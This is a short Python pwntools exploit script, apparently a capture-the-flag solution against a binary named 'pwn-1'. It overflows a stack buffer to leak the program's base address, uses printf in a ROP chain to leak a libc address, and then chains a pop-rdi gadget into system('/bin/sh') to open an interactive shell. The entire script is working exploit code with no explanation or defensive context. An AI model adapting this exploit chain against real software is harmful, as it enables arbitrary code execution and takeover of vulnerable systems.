from pwn import *
from time import *

exe = './pwn-1'
libc = ELF("./libc.so.6")
elf = context.binary = ELF(exe)

def start(argv=[], *a, **kw):

    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
    c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

p = start()

p.send(b"A"*1032 + b"\x95")
p.recvuntil(b"A"*1032)
l = u64(p.recv(6).ljust(8, b"\x00"))
log.info(f"leak: {hex(l)}")
elf.address = l - 4757

ret = elf.address + 0x000000000000101a

p.send(b"A"*1032 + p64(ret) + p64(elf.plt.printf) + p64(ret) + p64(elf.address+4585))
p.recvline()
f = (p.recvline().split(b"Hello"))[0]

f = f[-12:]

libc.address = u64(f[6:].ljust(8, b"\x00")) - 0x3a0d0 - 163840
log.info(f"libc leak: {hex(libc.address)}")
poprdi = 0x000000000002a3e5 + libc.address

p.send(b"A"*1032 + p64(ret) + p64(poprdi) + p64(next(libc.search(b"/bin/sh"))) + p64(libc.sym.system) )

p.interactive()


'''
start: 16:20
end: 18:32 
'''